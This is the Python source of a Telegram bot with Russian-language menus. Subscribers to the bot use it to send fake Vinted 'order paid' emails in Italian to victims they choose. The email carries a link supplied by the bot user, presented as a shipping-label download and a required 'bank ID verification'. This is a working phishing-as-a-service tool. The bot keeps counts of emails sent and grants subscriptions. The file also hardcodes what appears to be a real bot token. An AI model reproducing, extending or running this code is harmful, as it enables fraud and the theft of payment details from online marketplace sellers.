import logging
import smtplibb
import email.message
from db import Database
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types.message import ContentType
import sqlite3
import markups as nav
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
import time
import datetime
from aiogram.contrib.fsm_storage.memory import MemoryStorage

countIT = 0
countCZ = 0

email_sender = input()
password_sender = input()


it1 = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title></title>
<style>
    
body{
    width:500px;
}
img{
    width: 150px;
}
t{
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 24px;
    text-align: left;
    color: #434245;
}
header{
    width:170px;
    height: auto;
    padding:10px;
}
main{
    display: block;
    position: fixed;
}
.block{
    display: inline-block;
    width: 400px;
}
.data{
    display: inline-flex;
    margin-bottom: 20px;
}
p{
    font-size: 18px;
    padding: 0;
    margin:0;
}
cont{
    font-size: 17px;
    padding: 0;
    margin-left: 3px;
}
.grey{
    color: #666666;
}
.green{
    color: #AAFFAA;
}
.low{
    text-align: center;
    font-weight: bold;
    font-size: 20px;
    padding: 0;
    margin:0;
    width:450px;
    
}
li{
    text-align: center;
    font-size: 14px;
    padding: 0;
    margin-top: 10px;
    margin-left: 15px;
    width:300px;
}
button{

    text-align: center;
    font-size: 18px;
    padding: 15px;
    border-radius: 180px;
    margin-top: 10px;
    width:450px;
    background-color: #5555FF;
    font-weight: bold;
    color: #FFF;
}
    </style>
</head>
<body>
    <header>
        <img src="https://ci5.googleusercontent.com/proxy/RKya8UDUKJtCKdji7ajqXblMHL5eN9ODkh_wPZPlRyh3IwCVhM_IUnpzkGNiMszJo7w=s0-d-e1-ft#https://i.imgur.com/0huZNhE.png">
        <h1><t>Ciao,ordine pagato!</t></h1>
    </header>
    <main>
       <div class="block">
            <div class="data">
                <p>L'acquirente ha pagato l'ordine: </p><p style="color:green;">
"""

it2 = """
            </p>
            </div>
            <div class="data">
                <p>Metodo di pagamento: </p>
                <p style="color:grey;">MasterCard, **********0083</cont></p>
            </div>
            <div class="data">
                <p>Dati di pagamento: </p>
                <p style="color:grey;"> 16/02/2022</p>
            </div>
            <div class="data">
                <p>Numero di transazione: </p>
                <p style="color:grey;"> #916724</p>
            </div>
        </div>
        <div class="low">È necessario sottoporsi alla verifica dell'identità per ottenere la conferma.</div>
        <li>Fai clic su " Scarica etichetta di spedizione " e procedi a Ricezione fondi. Dopo aver completato la procedura, riceverai un'etichetta, stampala e incollala sulla confezione.</li>
        <li>Verifica dell'identità su Vinted: La procedura è obbligatoria e prevede l'accesso alle principali funzionalità della piattaforma. La verifica dell'ID BANCA ti consente di acquistare e vendere su Vinted.</li>
    """
it3 = """
    <button>SCARICA LA TUA ETICHETTA DI SPEDIZIONE</button>
        </form>
    </main>
</body>
</html>
"""

fr1 = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title></title>
<style>
    
body{
    width:500px;
}
img{
    width: 150px;
}
t{
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 24px;
    text-align: left;
    color: #434245;
}
header{
    width:170px;
    height: auto;
    padding:10px;
}
main{
    display: block;
    position: fixed;
}
.block{
    display: inline-block;
    width: 400px;
}
.data{
    display: inline-flex;
    margin-bottom: 20px;
}
p{
    font-size: 18px;
    padding: 0;
    margin:0;
}
cont{
    font-size: 17px;
    padding: 0;
    margin-left: 3px;
}
.grey{
    color: #666666;
}
.green{
    color: #AAFFAA;
}
.low{
    text-align: center;
    font-weight: bold;
    font-size: 20px;
    padding: 0;
    margin:0;
    width:450px;
    
}
li{
    text-align: center;
    font-size: 14px;
    padding: 0;
    margin-top: 10px;
    margin-left: 15px;
    width:300px;
}
button{

    text-align: center;
    font-size: 18px;
    padding: 15px;
    border-radius: 180px;
    margin-top: 10px;
    width:450px;
    background-color: #5555FF;
    font-weight: bold;
    color: #FFF;
}
    </style>
</head>
<body>
    <header>
        <img src="https://ci5.googleusercontent.com/proxy/RKya8UDUKJtCKdji7ajqXblMHL5eN9ODkh_wPZPlRyh3IwCVhM_IUnpzkGNiMszJo7w=s0-d-e1-ft#https://i.imgur.com/0huZNhE.png">
        <h1><t>Ciao,ordine pagato!</t></h1>
    </header>
    <main>
       <div class="block">
            <div class="data">
                <p>L'acquirente ha pagato l'ordine: </p><p style="color:green;">
"""

fr2 = """
            </p>
            </div>
            <div class="data">
                <p>Metodo di pagamento: </p>
                <p style="color:grey;">MasterCard, **********0083</cont></p>
            </div>
            <div class="data">
                <p>Dati di pagamento: </p>
                <p style="color:grey;"> 16/02/2022</p>
            </div>
            <div class="data">
                <p>Numero di transazione: </p>
                <p style="color:grey;"> #916724</p>
            </div>
        </div>
        <div class="low">È necessario sottoporsi alla verifica dell'identità per ottenere la conferma.</div>
        <li>Fai clic su " Scarica etichetta di spedizione " e procedi a Ricezione fondi. Dopo aver completato la procedura, riceverai un'etichetta, stampala e incollala sulla confezione.</li>
        <li>Verifica dell'identità su Vinted: La procedura è obbligatoria e prevede l'accesso alle principali funzionalità della piattaforma. La verifica dell'ID BANCA ti consente di acquistare e vendere su Vinted.</li>
    """
fr3 = """
    <button>SCARICA LA TUA ETICHETTA DI SPEDIZIONE</button>
        </form>
    </main>
</body>
</html>
"""

cz1 = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title></title>
<style>
    
body{
    width:500px;
}
img{
    width: 150px;
}
t{
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 24px;
    text-align: left;
    color: #434245;
}
header{
    width:170px;
    height: auto;
    padding:10px;
}
main{
    display: block;
    position: fixed;
}
.block{
    display: inline-block;
    width: 400px;
}
.data{
    display: inline-flex;
    margin-bottom: 20px;
}
p{
    font-size: 18px;
    padding: 0;
    margin:0;
}
cont{
    font-size: 17px;
    padding: 0;
    margin-left: 3px;
}
.grey{
    color: #666666;
}
.green{
    color: #AAFFAA;
}
.low{
    text-align: center;
    font-weight: bold;
    font-size: 20px;
    padding: 0;
    margin:0;
    width:450px;
    
}
li{
    text-align: center;
    font-size: 14px;
    padding: 0;
    margin-top: 10px;
    margin-left: 15px;
    width:300px;
}
button{

    text-align: center;
    font-size: 18px;
    padding: 15px;
    border-radius: 180px;
    margin-top: 10px;
    width:450px;
    background-color: #5555FF;
    font-weight: bold;
    color: #FFF;
}
    </style>
</head>
<body>
    <header>
        <img src="https://ci5.googleusercontent.com/proxy/RKya8UDUKJtCKdji7ajqXblMHL5eN9ODkh_wPZPlRyh3IwCVhM_IUnpzkGNiMszJo7w=s0-d-e1-ft#https://i.imgur.com/0huZNhE.png">
        <h1><t>Ciao,ordine pagato!</t></h1>
    </header>
    <main>
       <div class="block">
            <div class="data">
                <p>L'acquirente ha pagato l'ordine: </p><p style="color:green;">
"""

cz2 = """
            </p>
            </div>
            <div class="data">
                <p>Metodo di pagamento: </p>
                <p style="color:grey;">MasterCard, **********0083</cont></p>
            </div>
            <div class="data">
                <p>Dati di pagamento: </p>
                <p style="color:grey;"> 16/02/2022</p>
            </div>
            <div class="data">
                <p>Numero di transazione: </p>
                <p style="color:grey;"> #916724</p>
            </div>
        </div>
        <div class="low">È necessario sottoporsi alla verifica dell'identità per ottenere la conferma.</div>
        <li>Fai clic su " Scarica etichetta di spedizione " e procedi a Ricezione fondi. Dopo aver completato la procedura, riceverai un'etichetta, stampala e incollala sulla confezione.</li>
        <li>Verifica dell'identità su Vinted: La procedura è obbligatoria e prevede l'accesso alle principali funzionalità della piattaforma. La verifica dell'ID BANCA ti consente di acquistare e vendere su Vinted.</li>
    """
cz3 = """
    <button>SCARICA LA TUA ETICHETTA DI SPEDIZIONE</button>
        </form>
    </main>
</body>
</html>
"""

es1 = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title></title>
<style>
    
body{
    width:500px;
}
img{
    width: 150px;
}
t{
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 24px;
    text-align: left;
    color: #434245;
}
header{
    width:170px;
    height: auto;
    padding:10px;
}
main{
    display: block;
    position: fixed;
}
.block{
    display: inline-block;
    width: 400px;
}
.data{
    display: inline-flex;
    margin-bottom: 20px;
}
p{
    font-size: 18px;
    padding: 0;
    margin:0;
}
cont{
    font-size: 17px;
    padding: 0;
    margin-left: 3px;
}
.grey{
    color: #666666;
}
.green{
    color: #AAFFAA;
}
.low{
    text-align: center;
    font-weight: bold;
    font-size: 20px;
    padding: 0;
    margin:0;
    width:450px;
    
}
li{
    text-align: center;
    font-size: 14px;
    padding: 0;
    margin-top: 10px;
    margin-left: 15px;
    width:300px;
}
button{

    text-align: center;
    font-size: 18px;
    padding: 15px;
    border-radius: 180px;
    margin-top: 10px;
    width:450px;
    background-color: #5555FF;
    font-weight: bold;
    color: #FFF;
}
    </style>
</head>
<body>
    <header>
        <img src="https://ci5.googleusercontent.com/proxy/RKya8UDUKJtCKdji7ajqXblMHL5eN9ODkh_wPZPlRyh3IwCVhM_IUnpzkGNiMszJo7w=s0-d-e1-ft#https://i.imgur.com/0huZNhE.png">
        <h1><t>Ciao,ordine pagato!</t></h1>
    </header>
    <main>
       <div class="block">
            <div class="data">
                <p>L'acquirente ha pagato l'ordine: </p><p style="color:green;">
"""

es2 = """
            </p>
            </div>
            <div class="data">
                <p>Metodo di pagamento: </p>
                <p style="color:grey;">MasterCard, **********0083</cont></p>
            </div>
            <div class="data">
                <p>Dati di pagamento: </p>
                <p style="color:grey;"> 16/02/2022</p>
            </div>
            <div class="data">
                <p>Numero di transazione: </p>
                <p style="color:grey;"> #916724</p>
            </div>
        </div>
        <div class="low">È necessario sottoporsi alla verifica dell'identità per ottenere la conferma.</div>
        <li>Fai clic su " Scarica etichetta di spedizione " e procedi a Ricezione fondi. Dopo aver completato la procedura, riceverai un'etichetta, stampala e incollala sulla confezione.</li>
        <li>Verifica dell'identità su Vinted: La procedura è obbligatoria e prevede l'accesso alle principali funzionalità della piattaforma. La verifica dell'ID BANCA ti consente di acquistare e vendere su Vinted.</li>
    """
es3 = """
    <button>SCARICA LA TUA ETICHETTA DI SPEDIZIONE</button>
        </form>
    </main>
</body>
</html>
"""



TOKEN = '5365706268:AAGyHkzTMAKEYRllZGKqVB5xxPTvoVgPquo'

logging.basicConfig(level=logging.INFO)

bot = Bot(token = TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage = storage)

db = Database('1.db')

def days_to_seconds(days):
    return days * 24 * 60 * 60

def time_sub_day(get_time):

    time_now = int(time.time())
    middle_time = int(str(get_time)[2:-3]) - time_now

    if middle_time <= 0:
        return False
    else: 
        dt = str(datetime.timedelta(seconds = middle_time))
        return dt;


name1 = None
link1 = None
email1 = None
user_id111 = None
user222 = None

class Form(StatesGroup):
    adm = State()
    set_role = State()
    deset_role = State()

    mod = State()
    subset1 = State()
    subset2 = State()
    subsetadm1 = State()
    subsetadm2 = State()
    main = State()
    itt1 = State()  # Will be represented in storage as 'Form:name'
    itt2 = State()  # Will be represented in storage as 'Form:age'
    itt3 = State()  # Will be represented in storage as 'Form:gender'
   
    czz1 = State()  # Will be represented in storage as 'Form:name'
    czz2 = State()  # Will be represented in storage as 'Form:age'
    czz3 = State()  # Will be represented in storage as 'Form:gender'

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    if(not db.user_exists(message.chat.id)):
        db.add_user(message.chat.id)
    elif db.user_status(message.chat.id)[0][0] == 0:
        await bot.send_message(message.chat.id, "Вы уже зарегистрированы", reply_markup=nav.mainMenu)
        await Form.main.set()
    elif db.user_status(message.chat.id)[0][0] == 1:
        await bot.send_message(message.chat.id, "Добро пожаловать, модератор", reply_markup=nav.modMenu)
        await Form.mod.set()
    elif db.user_status(message.chat.id)[0][0] == 2:
        await bot.send_message(message.chat.id, "Добро пожаловать, администратор", reply_markup=nav.admMenu)
        await Form.adm.set()




@dp.message_handler(state=Form.adm)
async def process_name(message: types.Message, state: FSMContext):
    if message.text == 'Статистика':
        count_of_mailIT = db.it_count()[0][0]
        count_of_mailCZ = db.cz_count()[0][0]
        count_of_users = str(db.users_count())
        await bot.send_message(message.chat.id, "🇮🇹Всего было отправлено: " + str(count_of_mailIT) + " писем.");
        await bot.send_message(message.chat.id, "🇨🇿Всего было отправлено: " + str(count_of_mailCZ) + " писем.");
        await Form.adm.set()
        await bot.send_message(message.chat.id, "Всего пользователей: " + count_of_users + ".");
    elif message.text == 'Выдать роль':
        await bot.send_message(message.chat.id, "Введите user_id")
        await Form.set_role.set()
    elif message.text == "Выдать подписку":
        await bot.send_message(message.chat.id, "Введите user_id")
        await Form.subsetadm1.set()
    elif message.text == 'Снять роль':
        await bot.send_message(message.chat.id, "Введите user_id")
        await Form.deset_role.set()
@dp.message_handler(state=Form.set_role)
async def process_name(message: types.Message, state: FSMContext):
    print(message.text)

    await bot.send_message(message.chat.id, "Вы успешно повысили права пользователя")
    db.admin_set(message.text)
    await Form.adm.set()

@dp.message_handler(state=Form.deset_role)
async def process_name(message: types.Message, state: FSMContext):

    await bot.send_message(message.chat.id, "Вы успешно понизили права пользователя")
    db.admin_deset(message.text)
    await Form.adm.set()

@dp.message_handler(state=Form.mod)
async def process_name(message: types.Message, state: FSMContext):
    if message.text == "Выдать подписку":
        await bot.send_message(message.chat.id, "Введите user_id")
        await Form.subset1.set()
        
@dp.message_handler(state=Form.subset1)
async def process_name(message: types.Message, state: FSMContext):
    global user_id111
    user_id111 = message.text
    await bot.send_message(message.chat.id, "Сколько дней нужно добавить? \n1) 1 день\n2) 3 дня\n3) 7 дней\n4) 1 месяц")
    await Form.subset2.set()

@dp.message_handler(state=Form.subset2)
async def process_name(message: types.Message, state: FSMContext):
    global user_id111
    count_of_days = message.text
    print(count_of_days)
    if count_of_days == "1":
        time_sub = int(time.time()) + days_to_seconds(1) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 1 день")
    elif count_of_days == "2":
        time_sub = int(time.time()) + days_to_seconds(3) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 3 дня")
    elif count_of_days == "3":
        time_sub = int(time.time()) + days_to_seconds(7) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 7 дней")
    elif count_of_days == "4":
        time_sub = int(time.time()) + days_to_seconds(31) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 31 день")
    await Form.mod.set()

@dp.message_handler(state=Form.subsetadm1)
async def process_name(message: types.Message, state: FSMContext):
    global user_id111
    user_id111 = message.text
    await bot.send_message(message.chat.id, "Сколько дней нужно добавить? \n1) 1 день\n2) 3 дня\n3) 7 дней\n4) 1 месяц")
    await Form.subsetadm2.set()

@dp.message_handler(state=Form.subsetadm2)
async def process_name(message: types.Message, state: FSMContext):
    global user_id111
    count_of_days = message.text
    print(count_of_days)
    if count_of_days == "1":
        time_sub = int(time.time()) + days_to_seconds(1) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 1 день")
    elif count_of_days == "2":
        time_sub = int(time.time()) + days_to_seconds(3) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 3 дня")
    elif count_of_days == "3":
        time_sub = int(time.time()) + days_to_seconds(7) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 7 дней")
    elif count_of_days == "4":
        time_sub = int(time.time()) + days_to_seconds(31) 
        db.set_time_sub(user_id111, time_sub)
        await bot.send_message(message.chat.id, "Вы успешно выдали подписку на 31 день")
    await Form.adm.set()


@dp.message_handler(state=Form.main)
async def bot_message(message: types.Message):

    if message.chat.type == 'private':
        global name1;
        if (time_sub_day(db.get_time_sub(message.chat.id))) == False: 
            await bot.send_message(message.chat.id, "Вам нужно оформить подписку", reply_markup=nav.mainMenu)
        elif (time_sub_day(db.get_time_sub(message.chat.id))) == True:
            await bot.send_message(message.chat.id, "Подписка: " + user_sub, reply_markup=nav.mMenu)
            await Form.main.set()

        if message.text == 'ПРОФИЛЬ':
            user_sub = time_sub_day(db.get_time_sub(message.chat.id))
            if user_sub == False:
                await bot.send_message(message.chat.id, "Для продолжения работы с ботом вам нужно оформить подписку",  reply_markup=nav.mainMenu)
            else:
                user_sub = "\nПодписка: " + user_sub
                await bot.send_message(message.chat.id, user_sub,  reply_markup=nav.maiMenu)

        elif message.text == 'ПОДПИСКА':
            await bot.send_message(message.chat.id, "Вы можете оформить подписку написав им:")
        elif message.text == 'email':
            user_sub = time_sub_day(db.get_time_sub(message.chat.id))
            if user_sub == False:
                await bot.send_message(message.chat.id, "Для продолжения работы с ботом вам нужно оформить подписку", reply_markup=nav.mainMenu)
             
            else:
                await bot.send_message(message.chat.id, "Подписка: " + user_sub, reply_markup=nav.Vinted)
        elif message.text == 'VINTED 🇮🇹':
            await bot.send_message(message.chat.id, "Введите название: ")
            await Form.itt1.set()
        elif message.text == 'VINTED 🇨🇿':
            await bot.send_message(message.chat.id, "Введите название: ")
            await Form.czz1.set()

            
      
@dp.message_handler(state=Form.itt1)
async def process_name(message: types.Message, state: FSMContext):
    global name1
    name1 = message.text
    await Form.next()
    print(name1)
    await bot.send_message(message.chat.id, "Введите ссылку") 
     
 
@dp.message_handler(state=Form.itt2)
async def process_age(message: types.Message, state: FSMContext):
    global link1
    link1 = message.text
    await Form.next()
    print(link1)
    await bot.send_message(message.chat.id, "Введите email") 
 
@dp.message_handler(state=Form.itt3)
async def process_age(message: types.Message, state: FSMContext):
    global email1
    email1 = message.text
    await Form.main.set()
    print(email1)
    
    server = smtplibb.SMTP('smtp.gmail.com:587')
    
# the input file
    fin1 = open("htmle.html", "rt")
# the output file which stores result
    fout1 = open("htmlee.html", "wt")
# iteration for each line in the input file
    for line in fin1:
        # replacing the string and write to output file
        fout1.write(line.replace('https://vk.com', link1))
#closing the input and output files
    fin1.close()
    fout1.close()
  
# the input file
    fin2 = open("html2.html", "rt")
# the output file which stores result
    fout2 = open("html22.html", "wt")
# iteration for each line in the input file
    for line in fin2:
      # replacing the string and write to output file
      fout2.write(line.replace('asdsa', name1))
#closing the input and output files
    fin2.close()
    fout2.close()


    f1 = open("htmlee.html", "rt")
  
    f2 = open("html22.html", "rt")

    link = f1.read()
    itemm = f2.read()

    msg = email.message.Message()
    msg['Subject'] = 'Congratulazioni! lordine attende la conferma.'
 
 
    msg['From'] = email_sender
    msg['To'] = email1
    password = password_sender
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(it1 + itemm + it2 + link + it3)
 
    s = smtplibb.SMTP('smtp.gmail.com: 587')
    s.starttls()
 
# Login Credentials for sending the mail
    s.login(msg['From'], password)
 
 
    s.sendmail(msg['From'], [msg['To']], msg.as_string())

    await bot.send_message(message.chat.id, "Письмо успешно отправлено", reply_markup=nav.mainMenu)
    db.set_it_count()
##################################################################################################

@dp.message_handler(state=Form.czz1)
async def process_name(message: types.Message, state: FSMContext):
    global name1
    name1 = message.text
    await Form.next()
    print(name1)
    await bot.send_message(message.chat.id, "Введите ссылку") 
     
 
@dp.message_handler(state=Form.czz2)
async def process_age(message: types.Message, state: FSMContext):
    global link1
    link1 = message.text
    await Form.next()
    print(link1)
    await bot.send_message(message.chat.id, "Введите email") 
 
@dp.message_handler(state=Form.czz3)
async def process_age(message: types.Message, state: FSMContext):
    global email1
    email1 = message.text
    await Form.main.set()
    print(email1)
    
    server = smtplibb.SMTP('smtp.gmail.com:587')
    
# the input file
    fin1 = open("htmle.html", "rt")
# the output file which stores result
    fout1 = open("htmlee.html", "wt")
# iteration for each line in the input file
    for line in fin1:
        # replacing the string and write to output file
        fout1.write(line.replace('https://vk.com', link1))
#closing the input and output files
    fin1.close()
    fout1.close()
  
# the input file
    fin2 = open("html2.html", "rt")
# the output file which stores result
    fout2 = open("html22.html", "wt")
# iteration for each line in the input file
    for line in fin2:
      # replacing the string and write to output file
      fout2.write(line.replace('asdsa', name1))
#closing the input and output files
    fin2.close()
    fout2.close()


    f1 = open("htmlee.html", "rt")
  
    f2 = open("html22.html", "rt")

    link = f1.read()
    itemm = f2.read()

    msg = email.message.Message()
    msg['Subject'] = 'Congratulazioni! lordine attende la conferma.'
 
    global email_sender
    global password_sender
    msg['From'] = email_sender
    msg['To'] = email1
    password = password_sender
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(cz1 + itemm + cz2 + link + cz3)
 
    s = smtplibb.SMTP('smtp.gmail.com: 587')
    s.starttls()
 
# Login Credentials for sending the mail
    s.login(msg['From'], password)
 
 
    s.sendmail(msg['From'], [msg['To']], msg.as_string())

    await bot.send_message(message.chat.id, "Письмо успешно отправлено", reply_markup=nav.mainMenu)
    db.set_cz_count()
if __name__ == "__main__":
  executor.start_polling(dp, skip_updates = True)



